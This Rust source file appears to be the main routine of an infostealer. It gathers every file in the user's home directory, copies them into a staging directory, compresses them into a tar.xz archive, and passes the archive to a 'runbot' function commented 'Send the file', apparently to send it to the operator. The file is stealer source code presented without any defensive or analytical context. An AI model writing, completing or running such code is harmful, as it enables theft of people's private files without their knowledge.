use std::{fs, path::Path};
use solcrypt::VarSet;
mod bot;
use bot::runbot;

#[tokio::main]
async fn main() {
    let main_varset = VarSet::new(); // Lord forgive this, if according to your judgement it is a sin.
    let homedirfiles = solcrypt::get_all_files(&main_varset.home);
    
    // Create a directory containing every file the user has in their home directory
    match fs::create_dir(&main_varset.dirpath) {
        Ok(dir) => dir,
        Err(e) => eprintln!("ERROR: {:?}", e),
    };

    for file in homedirfiles {
        match tokio::task::spawn(async move {
            let task_varset = VarSet::new();
            let og_filepath = Path::new(&file);
            let filename = og_filepath.file_name().unwrap().to_str().unwrap();

            match fs::copy(&file, format!("{0}\\{1}", task_varset.dirpath, &filename)) {
                Ok(..) => {},
                Err(e) => { eprintln!("ERROR: {}, from: {}, to: {}", e, &file, format!("{0}\\{1}", task_varset.dest, &filename)) },
            }
        }).await {
            Ok(taskres) => taskres,
            Err(e) => {
                eprintln!("Task failed: {}", e);
            }
        }
    }
    dbg!("Compressing");

    match tokio::task::spawn(async {
        let task_varset = VarSet::new();
        solcrypt::compress_directory_to_tar_xz(task_varset.dirpath.clone(), task_varset.dest.clone()).unwrap();
    }).await {
        Ok(taskres) => taskres,
        Err(e) => {
            eprintln!("Task failed: {}", e);
        }
    };
    
    // Send the file
    runbot(main_varset.dest).await;

}
